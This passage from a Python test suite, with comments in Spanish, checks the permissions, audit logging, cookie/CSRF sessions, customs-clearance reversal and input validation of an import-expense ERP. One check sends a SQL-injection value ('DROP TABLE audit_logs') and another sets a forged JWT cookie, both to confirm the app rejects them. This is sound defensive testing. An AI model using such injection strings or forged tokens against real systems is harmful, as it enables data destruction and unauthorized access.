    s = time.perf_counter(); c.post("/login", data={"username": u, "password": "mala"}); return time.perf_counter() - s
te = sum(t("admin") for _ in range(4)) / 4; tn = sum(t("noexiste") for _ in range(4)) / 4
limiter.enabled = True
chk("V18", "Login tarda lo mismo exista o no el usuario", 0.5 < (tn / te) < 2, f"existe={te*1000:.0f} ms / no existe={tn*1000:.0f} ms")

# V20: política de usuarios
w = c.post("/usuarios/", json={"id_rol": 1, "username": "nuevo1", "email": "no-es-email", "password": "1"}, headers=H["admin"]).status_code
x = c.post("/usuarios/", json={"id_rol": 9, "username": "nuevo2", "email": "a@b.pe", "password": "ClaveSegura123"}, headers=H["admin"]).status_code
y = c.post("/usuarios/", json={"id_rol": 3, "username": "teso2", "email": "Teso2@Empresa.PE", "password": "ClaveSegura123"}, headers=H["admin"])
chk("V20", "Clave débil/email inválido/rol inexistente -> 422; usuario válido -> 200", (w, x, y.status_code) == (422, 422, 200), f"{w}/{x}/{y.status_code} email={y.json().get('email')}")

# V21: docs
chk("V21", "Swagger y OpenAPI ocultos por defecto", (c.get("/docs").status_code, c.get("/openapi.json").status_code) == (404, 404), f"{c.get('/docs').status_code}/{c.get('/openapi.json').status_code}")

# V15: fuga de errores
from services.errores import error_interno
from sqlalchemy.exc import IntegrityError
e1 = error_interno("Error al crear gasto", Exception('relation "registro_gastos" SELECT secret_col'))
e2 = error_interno("Error al crear gasto", IntegrityError("INSERT INTO registro_gastos", {}, Exception("fk_violation detail")))
chk("V15", "Errores internos no exponen SQL; devuelven código de referencia", "SELECT" not in e1.detail and "INSERT" not in e2.detail and "referencia" in e2.detail, f"{e2.detail}")

# TC oficial
hoy = str(datetime.date.today())
a = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.70, "precio_venta": 3.71}, headers=H["logi"]).status_code
b = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.80, "precio_venta": 3.71}, headers=H["teso"]).status_code
cc = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.70, "precio_venta": 3.7125}, headers=H["teso"])
g_ = c.get(f"/tipo-cambio/{hoy}", headers=H["audi"])
chk("TC1", "TC oficial: Logística 403, compra>venta 400, Tesorería registra (4 decimales) y todos leen", (a, b, cc.status_code, g_.status_code) == (403, 400, 200, 200) and str(g_.json()["precio_venta"]).startswith("3.7125"), f"{a}/{b}/{cc.status_code}/{g_.status_code} venta={g_.json().get('precio_venta')}")
m = mk_maestro("F-TC"); d = mk_dam(m, "DAM-TC"); g = mk_gasto(d, c_otro.id_concepto, 100, "USD"); v = mk_voucher(1000, "PEN", num="OP-TC")
ok = pagar2(g, v["id_voucher"], "371.25", "PEN", "3.7125").status_code
db.expire_all(); log = db.query(models.AuditLog).filter(models.AuditLog.accion.like("%TIPO CAMBIO%")).count()
chk("TC2", "Pago al TC oficial aceptado; cambios de TC auditados", ok == 200 and log >= 1, f"pago={ok} logs_tc={log}")

# ==========================================
# 3b. FASE 3: BITÁCORA AUTOMÁTICA Y SESIÓN POR COOKIE
# ==========================================

print("\n=========== E) FASE 3: BITÁCORA AUTOMÁTICA ===========")
import json as _json
def logs(tabla=None, id_reg=None, accion=None, who="audi"):
    p = {"limit": 500}
    if tabla: p["tabla"] = tabla
    if id_reg is not None: p["id_registro"] = id_reg
    if accion: p["accion"] = accion
    r = c.get("/auditoria/", params=p, headers=H[who])
    return r.status_code, (r.json() if r.status_code == 200 else [])

m = mk_maestro("F-B1")
c.put(f"/maestros/{m}", json={"n_cont_fisico": "CONT-AAA"}, headers=H["logi"])
st, ev = logs("maestro_importaciones", m)
mod = [e for e in ev if e["accion"] == "MODIFICACION Contenedor" and "n_cont_fisico" in _json.loads(e["detalles"]).get("cambios", {})]
alta = [e for e in ev if e["accion"] == "ALTA Contenedor"]
chk("B1", "Alta y modificación de contenedor registradas con autor, IP, ruta y antes/después",
    st == 200 and alta and mod and mod[0]["nombre_usuario"] == "logi" and _json.loads(mod[0]["detalles"])["cambios"]["n_cont_fisico"] == [None, "CONT-AAA"] and mod[0]["endpoint"].startswith("PUT /maestros"),
    f"{st} altas={len(alta)} mods={len(mod)} -> {mod[0]['nombre_usuario'] if mod else ''} {mod[0]['endpoint'] if mod else ''} {_json.loads(mod[0]['detalles'])['cambios'] if mod else ''}")

b = c.post("/bancos/", json={"nombre": "BANCO B2"}, headers=H["teso"]).json()["id_banco"]
c.put(f"/bancos/{b}", json={"nombre": "BANCO B2 RENOMBRADO"}, headers=H["teso"])
c.request("DELETE", f"/bancos/{b}", headers=H["teso"])
st, ev = logs("cat_bancos", b)
chk("B2", "Catálogos: alta, renombre y desactivación lógica quedan trazados", st == 200 and len(ev) >= 3 and any("estado_registro" in e["detalles"] for e in ev), f"{len(ev)} eventos: {[e['accion'] for e in ev]}")

d = mk_dam(m, "DAM-B3"); g = mk_gasto(d, c_otro.id_concepto, 100, doc_n="B3-1"); v = mk_voucher(500, num="OP-B3")
p = pagar2(g, v["id_voucher"], 100).json()
st, ev = logs("vouchers_bancarios", v["id_voucher"])
saldo_ev = [e for e in ev if "saldo_disponible" in _json.loads(e["detalles"]).get("cambios", {})]
chk("B3", "Pago: el descuento del voucher queda trazado (500 -> 400) firmado por Tesorería",
    saldo_ev and _json.loads(saldo_ev[0]["detalles"])["cambios"]["saldo_disponible"] == ["500.00", "400.00"] and saldo_ev[0]["nombre_usuario"] == "teso",
    f"{[_json.loads(e['detalles'])['cambios'] for e in saldo_ev]}")
c.request("DELETE", f"/pagos/{p['id_pago']}", json={"motivo": "prueba de bitacora"}, headers=H["teso"])
st, ev = logs("registro_pagos", p["id_pago"])
chk("B4", "Anulación de pago: BAJA con snapshot de valores previos", any(e["accion"] == "BAJA Pago" and "valores_previos" in e["detalles"] for e in ev), f"{[e['accion'] for e in ev]}")

r = c.post("/usuarios/", json={"id_rol": 2, "username": "logi_b5", "email": "b5@empresa.pe", "password": "ClaveSegura123"}, headers=H["admin"])
st, ev = logs("usuarios", r.json()["id_usuario"], who="admin")
chk("B5", "Alta de usuario auditada sin exponer el hash de la contraseña", ev and "$2b$" not in ev[0]["detalles"] and '"hashed_password": "***"' in ev[0]["detalles"], ev[0]["detalles"][:140] if ev else "sin eventos")

# Un rollback no debe dejar rastro de un cambio que nunca ocurrió
antes = len(logs("vouchers_bancarios")[1])
r = pagar2(g, v["id_voucher"], "99999")  # sobrepago -> 400 tras haber descontado en memoria
despues = len(logs("vouchers_bancarios")[1])
chk("B6", "Operación rechazada (rollback) no deja eventos huérfanos en la bitácora", r.status_code == 400 and antes == despues, f"{r.status_code} eventos voucher {antes} -> {despues}")

st1, _ = logs(who="logi"); st2, _ = logs(who="teso")
r = c.get("/auditoria/", params={"tabla": "x'; DROP TABLE audit_logs;--"}, headers=H["audi"])
chk("B7", "Bitácora: solo Admin/Auditor la leen; filtro de tabla validado", (st1, st2, r.status_code) == (403, 403, 400), f"logi={st1} teso={st2} tabla_maliciosa={r.status_code}")


print("\n=========== F) FASE 3: SESIÓN POR COOKIE httpOnly + CSRF ===========")
from fastapi.testclient import TestClient as _TC
from dependencies import limiter as _lim
_lim.enabled = False
nav = _TC(main.app)  # cliente "navegador": conserva cookies entre peticiones
r = nav.post("/login", data={"username": "teso", "password": "Clave123!"})
set_cookie = r.headers.get("set-cookie", "")
chk("S1", "Login del navegador: token SOLO en cookie httpOnly+SameSite=Strict; el cuerpo no trae el JWT",
    r.status_code == 200 and "access_token" not in r.json() and r.json()["usuario"]["id_rol"] == 3
    and "erp_session=" in set_cookie and "httponly" in set_cookie.lower() and "samesite=strict" in set_cookie.lower(),
    f"{r.status_code} body={list(r.json().keys())} cookie_flags={[p.strip() for p in set_cookie.split(';')[1:]]}")

r = nav.get("/me")
chk("S2", "/me valida la sesión por cookie", r.status_code == 200 and r.json()["username"] == "teso", f"{r.status_code} {r.json()}")

b_sin = nav.post("/bancos/", json={"nombre": "BANCO CSRF"})
b_con = nav.post("/bancos/", json={"nombre": "BANCO CSRF OK"}, headers={"X-Requested-With": "XMLHttpRequest"})
chk("S3", "CSRF: escritura con cookie y sin X-Requested-With -> 403; con el header -> 200", (b_sin.status_code, b_con.status_code) == (403, 200), f"{b_sin.status_code}/{b_con.status_code}")

st, ev = logs("cat_bancos", b_con.json()["id_banco"])
chk("S4", "Escrituras por cookie quedan firmadas en la bitácora", ev and ev[0]["nombre_usuario"] == "teso", f"{ev[0]['nombre_usuario'] if ev else None}")

nav.post("/logout", headers={"X-Requested-With": "XMLHttpRequest"})
r = nav.get("/me")
chk("S5", "Logout elimina la cookie: /me -> 401", r.status_code == 401, f"{r.status_code}")

anon = _TC(main.app)
r = anon.get("/gastos/")
chk("S6", "Sin cookie ni Bearer -> 401", r.status_code == 401, f"{r.status_code} {det(r)}")

r = anon.post("/login", data={"username": "teso", "password": "Clave123!"}, headers={"X-Auth-Mode": "bearer"})
tok = r.json().get("access_token")
r2 = anon.get("/me", headers={"Authorization": f"Bearer {tok}"})
chk("S7", "Modo script (X-Auth-Mode: bearer) entrega token y funciona como Bearer (scripts/cargar_plantillas.py)", bool(tok) and r2.status_code == 200, f"token={'sí' if tok else 'no'} /me={r2.status_code}")

forjada = _TC(main.app); forjada.cookies.set("erp_session", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.firma-falsa")
r = forjada.get("/me")
chk("S8", "Cookie con JWT falsificado -> 401", r.status_code == 401, f"{r.status_code}")
_lim.enabled = True


# ==========================================
# 3c. REVERSIÓN AUTOMÁTICA DE LEVANTE
# ==========================================

print("\n=========== G) REVERSIÓN AUTOMÁTICA DE LEVANTE (caso GF-26522 / GF-26222) ===========")
_c_omc = db.query(models.CatConceptoPago).filter_by(nombre="OMC").first()
if not _c_omc:
    _c_omc = models.CatConceptoPago(nombre="OMC", clase_aduanera="OMC"); db.add(_c_omc); db.commit()

def maestro_estado(idm):
    db.expire_all(); mm = db.get(models.MaestroImportacion, idm); return mm.estado_documentario, mm.fecha_levante_maestro

def contenedor_con_omc_pendiente(factura, sufijo):
    """Contenedor DEFINITIVO, canal ROJO, proforma pagada, aforo con observación, OMC registrada y pendiente."""
    idm = mk_maestro(factura); idd = mk_dam(idm, f"DAM-{sufijo}", "ROJO")
    gt = mk_gasto(idd, c_trib.id_concepto, 50, doc_n=f"T-{sufijo}"); gp = mk_gasto(idd, c_perc.id_concepto, 5, doc_n=f"P-{sufijo}")
    vv = mk_voucher(55, num=f"OP-PROF-{sufijo}")
    pagar2(gt, vv["id_voucher"], 50); pagar2(gp, vv["id_voucher"], 5)
    for e in ["OBSERVADA / NOTIFICADA", "EN REVISIÓN"]:
        c.put(f"/dams/{idd}", json={"estado_dam": e}, headers=H["logi"])
    go = mk_gasto(idd, _c_omc.id_concepto, 300, doc_n=f"OMC-{sufijo}")
    return idm, idd, go, gt

m1, d1, omc1, trib1 = contenedor_con_omc_pendiente("GF-26522", "26522")
m2, d2, omc2, trib2 = contenedor_con_omc_pendiente("GF-26222", "26222")
chk("G0", "Ambos contenedores quedan a un pago de la OMC", dam(d1).estado_dam == dam(d2).estado_dam == "PENDIENTE PAGO OMC", f"{dam(d1).estado_dam} / {dam(d2).estado_dam}")

v_omc = mk_voucher(300, num="OP-OMC-UNICO")
# ERROR DE DIGITACIÓN: el pago era del GF-26522 pero se registra en el GF-26222
p_err = pagar2(omc2, v_omc["id_voucher"], 300).json()
chk("G1", "Pago registrado por error en GF-26222 -> el sistema le da levante (estado indebido)", dam(d2).estado_dam == "CON LEVANTE", f"GF-26222 DAM={dam(d2).estado_dam} contenedor={maestro_estado(m2)}")

r = c.request("DELETE", f"/pagos/{p_err['id_pago']}", json={"motivo": "Pago registrado en contenedor equivocado (era GF-26522)"}, headers=H["teso"])
rev = r.json().get("reversion_dam") if r.status_code == 200 else None
est2, fecha2 = maestro_estado(m2)
chk("G2", "Al anular el pago, GF-26222 vuelve a PENDIENTE PAGO OMC, pierde la fecha de levante y el contenedor recalcula",
    r.status_code == 200 and dam(d2).estado_dam == "PENDIENTE PAGO OMC" and dam(d2).fecha_levante is None and est2 != "CON LEVANTE (PEND. INGRESO)" and fecha2 is None,
    f"{r.status_code} DAM={dam(d2).estado_dam} fecha_levante={dam(d2).fecha_levante} contenedor={est2} fecha_cont={fecha2}")
chk("G3", "La respuesta informa la reversión (para el aviso en pantalla)", bool(rev) and rev["contenedor"] == "GF-26222" and rev["estado_nuevo"] == "PENDIENTE PAGO OMC", f"{rev}")
db.expire_all(); lg = db.query(models.AuditLog).filter_by(accion="REVERSION AUTOMATICA DAM").order_by(models.AuditLog.id_log.desc()).first()
chk("G4", "Bitácora: evento 'REVERSION AUTOMATICA DAM' con contenedor, motivo y usuario", lg is not None and "GF-26222" in lg.detalles and lg.id_usuario == users["teso"], lg.detalles if lg else "sin evento")
chk("G5", "El voucher recuperó el dinero", voucher(v_omc["id_voucher"]).saldo_disponible == Decimal("300.00"), f"saldo={voucher(v_omc['id_voucher']).saldo_disponible}")

p_ok = pagar2(omc1, v_omc["id_voucher"], 300)
chk("G6", "Pago registrado en el contenedor correcto GF-26522 -> levante correcto; GF-26222 sigue pendiente",
    p_ok.status_code == 200 and dam(d1).estado_dam == "CON LEVANTE" and dam(d2).estado_dam == "PENDIENTE PAGO OMC", f"GF-26522={dam(d1).estado_dam} GF-26222={dam(d2).estado_dam}")

# Proforma: DAM con diligencias manuales -> Tesorería no puede anular; Admin sí (y revierte)
p_trib2 = db.query(models.RegistroPago).filter_by(id_gasto=trib2, estado_registro="ACTIVO").first()
a = c.request("DELETE", f"/pagos/{p_trib2.id_pago}", json={"motivo": "prueba proforma con diligencias"}, headers=H["teso"])
b = c.request("DELETE", f"/pagos/{p_trib2.id_pago}", json={"motivo": "admin autoriza corregir proforma"}, headers=H["admin"])
chk("G7", "Proforma de DAM con diligencias manuales: Tesorería 403; Admin 200 y la DAM vuelve a PENDIENTE PAGO PROFORMA",
    (a.status_code, b.status_code) == (403, 200) and dam(d2).estado_dam == "PENDIENTE PAGO PROFORMA", f"{a.status_code}/{b.status_code} DAM={dam(d2).estado_dam}")

# Canal VERDE: el levante lo dio el pago -> Tesorería puede anular y la DAM revierte
m3 = mk_maestro("GF-VERDE"); d3 = mk_dam(m3, "DAM-VERDE", "VERDE")
gt3 = mk_gasto(d3, c_trib.id_concepto, 20, doc_n="T-VERDE"); gp3 = mk_gasto(d3, c_perc.id_concepto, 2, doc_n="P-VERDE"); v3 = mk_voucher(22, num="OP-VERDE")
pt3 = pagar2(gt3, v3["id_voucher"], 20).json(); pagar2(gp3, v3["id_voucher"], 2)
antes = dam(d3).estado_dam
r = c.request("DELETE", f"/pagos/{pt3['id_pago']}", json={"motivo": "tributo registrado en contenedor errado"}, headers=H["teso"])
chk("G8", "Canal VERDE: anular tributo quita el levante automático (CON LEVANTE -> PENDIENTE PAGO PROFORMA)", antes == "CON LEVANTE" and r.status_code == 200 and dam(d3).estado_dam == "PENDIENTE PAGO PROFORMA", f"{antes} -> {dam(d3).estado_dam}")

# Bug corregido: con 2 gastos de tributos, pagar solo 1 NO debe dar levante
m4 = mk_maestro("GF-DOBLE"); d4 = mk_dam(m4, "DAM-DOBLE", "VERDE")
ta = mk_gasto(d4, c_trib.id_concepto, 10, doc_n="T-A"); tb = mk_gasto(d4, c_trib.id_concepto, 10, doc_n="T-B"); pp = mk_gasto(d4, c_perc.id_concepto, 1, doc_n="P-AB")
v4 = mk_voucher(21, num="OP-DOBLE"); pagar2(ta, v4["id_voucher"], 10); pagar2(pp, v4["id_voucher"], 1)
e_parcial = dam(d4).estado_dam
pagar2(tb, v4["id_voucher"], 10)
chk("G9", "Dos gastos de tributos: con uno solo pagado NO hay levante; con ambos sí", e_parcial == "PENDIENTE PAGO PROFORMA" and dam(d4).estado_dam == "CON LEVANTE", f"1 pagado={e_parcial} / 2 pagados={dam(d4).estado_dam}")


# ==========================================
# H) CLASE ADUANERA DEL CONCEPTO (el levante ya no depende del NOMBRE)
# ==========================================
print("\n=========== H) CLASE ADUANERA DEL CONCEPTO ===========")

def concepto(idc):
    db.expire_all(); return db.get(models.CatConceptoPago, idc)

def mk_concepto(nombre, clase=None, who="admin"):
    body = {"nombre": nombre}
    if clase is not None:
        body["clase_aduanera"] = clase
    return c.post("/conceptos/", json=body, headers=H[who])

# H1: al crear sin indicar la clase, el servidor la propone según el nombre (igual que antes de la migración)
r1 = mk_concepto("TRIBUTOS ADUANEROS H1"); r2 = mk_concepto("Percepción IGV H1"); r3 = mk_concepto("AJUSTE OMC H1"); r4 = mk_concepto("ALMACENAJE H1")
clases_h1 = [x.json().get("clase_aduanera") for x in (r1, r2, r3, r4)]
chk("H1", "Concepto creado sin clase: se propone según el nombre", clases_h1 == ["TRIBUTO", "PERCEPCION", "OMC", "NINGUNA"], f"{clases_h1}")

# H2: la clase enviada manda sobre el nombre, y un valor inválido se rechaza
r_ok = mk_concepto("DERECHOS SUNAT H2", "TRIBUTO"); r_no = mk_concepto("TRIBUTOS MUNICIPALES H2", "NINGUNA"); r_mal = mk_concepto("CONCEPTO H2", "TRIBUTOS")
chk("H2", "La clase explícita manda sobre el nombre; un valor fuera de catálogo se rechaza (422)",
    r_ok.json().get("clase_aduanera") == "TRIBUTO" and r_no.json().get("clase_aduanera") == "NINGUNA" and r_mal.status_code == 422,
    f"{r_ok.json().get('clase_aduanera')} / {r_no.json().get('clase_aduanera')} / {r_mal.status_code}")
id_trib_h = r_ok.json()["id_concepto"]; id_falso_h = r_no.json()["id_concepto"]
id_perc_h = mk_concepto("ADELANTO IGV H2", "PERCEPCION").json()["id_concepto"]

# H3: conceptos cuyo NOMBRE no dice "tributo" ni "percepción" pero cuya CLASE sí -> dan levante al pagarse
mh = mk_maestro("F-H3"); dh = mk_dam(mh, "DAM-H3", "VERDE")
gth = mk_gasto(dh, id_trib_h, 40, doc_n="T-H3"); gph = mk_gasto(dh, id_perc_h, 4, doc_n="P-H3")
e_reg = dam(dh).estado_dam
vh = mk_voucher(44, num="OP-H3")
pagar2(gth, vh["id_voucher"], 40); pagar2(gph, vh["id_voucher"], 4)
chk("H3", "La proforma se reconoce por la CLASE del concepto, no por su nombre", e_reg == "PENDIENTE PAGO PROFORMA" and dam(dh).estado_dam == "CON LEVANTE", f"registro={e_reg} pago={dam(dh).estado_dam}")

# H4: un concepto llamado "TRIBUTOS..." pero de clase NINGUNA no activa la proforma
mh4 = mk_maestro("F-H4"); dh4 = mk_dam(mh4, "DAM-H4", "VERDE")
mk_gasto(dh4, id_falso_h, 10, doc_n="X-H4"); mk_gasto(dh4, id_perc_h, 1, doc_n="P-H4")
chk("H4", "Un nombre con la palabra TRIBUTOS y clase NINGUNA no activa la proforma", dam(dh4).estado_dam == "NUMERADA / EN EVALUACIÓN", f"{dam(dh4).estado_dam}")

# H5: renombrar un concepto NO cambia su clase ni el levante de las DAMs que lo usan
mh5 = mk_maestro("F-H5"); dh5 = mk_dam(mh5, "DAM-H5", "VERDE")
gt5 = mk_gasto(dh5, id_trib_h, 30, doc_n="T-H5"); gp5 = mk_gasto(dh5, id_perc_h, 3, doc_n="P-H5")
r_ren = c.put(f"/conceptos/{id_trib_h}", json={"nombre": "ARANCELES H5"}, headers=H["admin"])
r_nul = c.put(f"/conceptos/{id_trib_h}", json={"clase_aduanera": None}, headers=H["admin"])
v5 = mk_voucher(33, num="OP-H5"); pagar2(gt5, v5["id_voucher"], 30); pagar2(gp5, v5["id_voucher"], 3)
chk("H5", "Renombrar el concepto (o enviar la clase vacía) conserva la clase y el levante sigue funcionando",
    r_ren.status_code == 200 and r_nul.status_code == 200 and concepto(id_trib_h).nombre == "ARANCELES H5" and concepto(id_trib_h).clase_aduanera == "TRIBUTO" and dam(dh5).estado_dam == "CON LEVANTE",
    f"{r_ren.status_code}/{r_nul.status_code} clase={concepto(id_trib_h).clase_aduanera} dam={dam(dh5).estado_dam}")

# H6: cambiar la clase desde el catálogo; roles sin permiso no pueden
r_cam = c.put(f"/conceptos/{id_falso_h}", json={"clase_aduanera": "OMC"}, headers=H["logi"])
r_aud = c.put(f"/conceptos/{id_falso_h}", json={"clase_aduanera": "TRIBUTO"}, headers=H["audi"])
chk("H6", "Logística puede cambiar la clase; Auditoría no (403)", r_cam.status_code == 200 and concepto(id_falso_h).clase_aduanera == "OMC" and r_aud.status_code == 403, f"{r_cam.status_code} clase={concepto(id_falso_h).clase_aduanera} audi={r_aud.status_code}")

# H7: carga masiva por Excel, con y sin la columna clase_aduanera
def subir_conceptos(filas, columnas):
    libro = openpyxl.Workbook(); hoja = libro.active; hoja.append(columnas)
    for f in filas:
        hoja.append(f)
    buf = io.BytesIO(); libro.save(buf); buf.seek(0)
    return c.post("/admin/carga-masiva?catalogo=conceptos", files={"archivo": ("conceptos.xlsx", buf.getvalue(), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet")}, headers=H["admin"])

r_sin = subir_conceptos([["TRIBUTOS H7", None, "FIJO_DESPACHO"], ["PERCEPCION OMC H7", None, "FIJO_DESPACHO"], ["MULTAS H7", None, "EXTRAORDINARIO"]], ["nombre_concepto", "descripcion", "tipo_gasto"])
r_con = subir_conceptos([["LIQUIDACION H7", None, "FIJO_DESPACHO", "omc"], ["ERRADO H7", None, "FIJO_DESPACHO", "TRIBUTOS"]], ["nombre_concepto", "descripcion", "tipo_gasto", "clase_aduanera"])
def clase_de(nombre):
    db.expire_all(); x = db.query(models.CatConceptoPago).filter_by(nombre=nombre).first(); return x.clase_aduanera if x else None
clases_h7 = [clase_de(n) for n in ("TRIBUTOS H7", "PERCEPCION OMC H7", "MULTAS H7", "LIQUIDACION H7", "ERRADO H7")]
chk("H7", "Excel sin la columna: clase según el nombre; con la columna: se respeta y un valor inválido se reporta sin insertar",
    r_sin.status_code == 200 and r_sin.json()["insertados"] == 3 and r_con.json()["insertados"] == 1 and r_con.json()["errores_count"] == 1
    and clases_h7 == ["TRIBUTO", "PERCEPCION", "NINGUNA", "OMC", None],
    f"sin={r_sin.json().get('insertados')} con={r_con.json().get('insertados')}/{r_con.json().get('errores_count')} clases={clases_h7}")

# H8: una fila con error en el Excel no debe borrar las filas buenas anteriores
r_dup = subir_conceptos([["BUENO UNO H8", None, "FIJO_DESPACHO"], ["TRIBUTOS H7", None, "FIJO_DESPACHO"], ["BUENO DOS H8", None, "FIJO_DESPACHO"]], ["nombre_concepto", "descripcion", "tipo_gasto"])
existen_h8 = [clase_de(n) is not None for n in ("BUENO UNO H8", "BUENO DOS H8")]
chk("H8", "Carga masiva: una fila duplicada se reporta y las demás filas SÍ quedan guardadas",
    r_dup.json().get("insertados") == 2 and r_dup.json().get("errores_count") == 1 and existen_h8 == [True, True],
    f"insertados={r_dup.json().get('insertados')} errores={r_dup.json().get('errores_count')} guardados={existen_h8}")


# ==========================================
# I) CATÁLOGOS ESTÁNDAR (rutas generadas por routers/catalogo_generico.py)
# ==========================================
print("\n=========== I) CATÁLOGOS ESTÁNDAR ===========")
r_b1 = c.post("/bancos/", json={"nombre": "BANCO I1"}, headers=H["teso"])
r_b2 = c.post("/bancos/", json={"nombre": "BANCO I1"}, headers=H["teso"])
r_b3 = c.post("/bancos/", json={"nombre": "BANCO I1B"}, headers=H["logi"])
chk("I1", "Bancos: Tesorería crea; nombre duplicado responde 400 con mensaje (antes 500); Logística 403",
    r_b1.status_code == 200 and r_b2.status_code == 400 and "ya está registrado" in det(r_b2) and r_b3.status_code == 403,
    f"{r_b1.status_code}/{r_b2.status_code} {det(r_b2)} / {r_b3.status_code}")

id_b = r_b1.json()["id_banco"]
r_baja = c.delete(f"/bancos/{id_b}", headers=H["teso"])
activos = [b["id_banco"] for b in c.get("/bancos/", headers=H["audi"]).json()]
todos = [b["id_banco"] for b in c.get("/bancos/?mostrar_inactivos=true", headers=H["audi"]).json()]
r_rest = c.put(f"/bancos/{id_b}/restaurar", headers=H["teso"])
chk("I2", "Baja lógica: mensaje, desaparece del listado de activos, aparece con mostrar_inactivos y se restaura",
    r_baja.json().get("mensaje") == "El banco 'BANCO I1' ha sido desactivado correctamente." and id_b not in activos and id_b in todos
    and r_rest.status_code == 200 and r_rest.json()["estado_registro"] == "ACTIVO",
    f"{r_baja.json()} activo={id_b in activos} todos={id_b in todos} restaurado={r_rest.json().get('estado_registro')}")

r_a1 = c.post("/almacenes/", json={"nombre": "ALMACEN I3"}, headers=H["logi"]); r_a2 = c.post("/almacenes/", json={"nombre": "ALMACEN I3B"}, headers=H["logi"])
r_a3 = c.put(f"/almacenes/{r_a2.json()['id_almacen']}", json={"nombre": "ALMACEN I3"}, headers=H["logi"])
r_a4 = c.put("/almacenes/999999", json={"nombre": "X"}, headers=H["logi"])
chk("I3", "Modificar con nombre ya usado responde 400 (antes 500); id inexistente 404 con mensaje propio",
    r_a3.status_code == 400 and r_a4.status_code == 404 and det(r_a4) == "Almacén no encontrado", f"{r_a3.status_code} {det(r_a3)} / {r_a4.status_code} {det(r_a4)}")

r_p = c.post("/proveedores/", json={"nombre": "PROVEEDOR I4", "ruc": "   "}, headers=H["logi"])
r_p2 = c.post("/proveedores/", json={"nombre": "PROVEEDOR I4B", "ruc": " 20100047218 "}, headers=H["logi"])
chk("I4", "Proveedores: RUC vacío se guarda como nulo y con espacios se recorta",
    r_p.json().get("ruc") is None and r_p2.json().get("ruc") == "20100047218", f"{r_p.json().get('ruc')!r} / {r_p2.json().get('ruc')!r}")

r_f1 = c.delete(f"/bancos/{banco.id_banco}/fisico", headers=H["admin"])
r_f2 = c.delete(f"/bancos/{id_b}/fisico", headers=H["teso"])
r_f3 = c.delete(f"/bancos/{id_b}/fisico", headers=H["admin"])
chk("I5", "Borrado físico: si el registro está en uso responde 400; solo SuperAdmin; un registro libre se elimina",
    r_f1.status_code == 400 and r_f2.status_code == 403 and r_f3.status_code == 200, f"{r_f1.status_code} {det(r_f1)} / {r_f2.status_code} / {r_f3.status_code}")


# ==========================================
# J) REGLA ÚNICA DE AMORTIZACIÓN (registrar, anular y reportes deben coincidir)
# ==========================================
print("\n=========== J) REGLA ÚNICA DE AMORTIZACIÓN ===========")
c.put("/tipo-cambio/", json={"fecha": str(datetime.date.today()), "precio_compra": "2.9900", "precio_venta": "3.0000"}, headers=H["teso"])
mj = mk_maestro("F-J1"); dj = mk_dam(mj, "DAM-J1"); gj = mk_gasto(dj, c_otro.id_concepto, "1.05", "USD", doc_n="J-1")
vj = mk_voucher(100, "PEN", num="OP-J1")
# Tres pagos de S/ 1.00 a TC 3.00 amortizan USD 0.33 cada uno (0.99): saldo USD 0.06 -> PARCIAL.
# Un cuarto pago igual supera el saldo y se rechaza por sobrepago.
r_j = [pagar2(gj, vj["id_voucher"], "1.00", "PEN", "3.00").status_code for _ in range(4)]
db.expire_all()
pagos_j = db.query(models.RegistroPago).filter_by(id_gasto=gj, estado_registro="ACTIVO").order_by(models.RegistroPago.id_pago).all()
# Un pago de S/ 0.03 (USD 0.01) deja 0.05: cierre automático con ajuste de centavos. Luego se anula ese pago:
# el ajuste se revierte y, con la regla única, el gasto vuelve a PARCIAL (antes la anulación lo daba por PAGADO).
r_extra = pagar2(gj, vj["id_voucher"], "0.03", "PEN", "3.00")
id_extra = r_extra.json().get("id_pago")
r_anul = c.request("DELETE", f"/pagos/{id_extra}", json={"motivo": "Prueba J1: anular pago chico"}, headers=H["teso"])
liq = c.get(f"/maestros/{mj}/liquidacion-gastos", headers=H["teso"])
saldo_liq = None
if liq.status_code == 200:
    for gg in liq.json().get("gastos", []):
        if gg.get("numero_documento") == "J-1":
            saldo_liq = gg.get("saldo_pendiente")
chk("J1", "Tras anular un pago, el gasto conserva el estado de la regla de registro (PARCIAL con saldo USD 0.06) y la liquidación muestra el mismo saldo",
    r_j == [200, 200, 200, 400] and len(pagos_j) == 3 and r_anul.status_code == 200 and gasto(gj).estado_pago == "PARCIAL" and saldo_liq in (0.06, "0.06"),
    f"pagos={len(pagos_j)} anulación={r_anul.status_code} estado={gasto(gj).estado_pago} saldo_liquidación={saldo_liq} (liq {liq.status_code})")


# ==========================================
# K) VALIDACIÓN DE LO QUE SE DIGITA (fase 5)
# ==========================================
print("\n=========== K) VALIDACIÓN DE LO QUE SE DIGITA ===========")
from domain.validaciones import digito_verificador_ruc


def ruc_valido(base10):
    return base10 + str(digito_verificador_ruc(base10))


def mensajes(r):
    detalle = r.json().get("detail")
    return " | ".join(d["msg"] for d in detalle) if isinstance(detalle, list) else str(detalle)


# K1: RUC con dígito verificador incorrecto se rechaza con un mensaje en español
r_k1 = c.post("/importadores/", json={"nombre": "IMP K1", "ruc": "20100047219"}, headers=H["logi"])
r_k1b = c.post("/importadores/", json={"nombre": "IMP K1B", "ruc": " 2010-0047-218 "}, headers=H["logi"])
chk("K1", "RUC: dígito verificador incorrecto -> 422 en español; con espacios/guiones se guarda limpio",
    r_k1.status_code == 422 and "dígito verificador" in mensajes(r_k1) and r_k1b.json().get("ruc") == "20100047218",
    f"{r_k1.status_code} {mensajes(r_k1)[:80]} / {r_k1b.json().get('ruc')}")

# K2: un agente antiguo con RUC fuera de formato se puede renombrar; cambiarle el RUC por uno inválido no
agente_viejo = models.CatAgente(nombre="AGENTE ANTIGUO K2", ruc="123"); db.add(agente_viejo); db.commit()
r_k2a = c.put(f"/agentes/{agente_viejo.id_agente}", json={"nombre": "AGENTE ANTIGUO K2 SAC", "ruc": "123"}, headers=H["logi"])
r_k2b = c.put(f"/agentes/{agente_viejo.id_agente}", json={"ruc": "20999999999"}, headers=H["logi"])
r_k2c = c.put(f"/agentes/{agente_viejo.id_agente}", json={"ruc": ruc_valido("2060000001")}, headers=H["logi"])
chk("K2", "RUC antiguo: editar otro dato no lo exige válido; cambiarlo sí (inválido 422, válido 200)",
    r_k2a.status_code == 200 and r_k2b.status_code == 422 and r_k2c.status_code == 200,
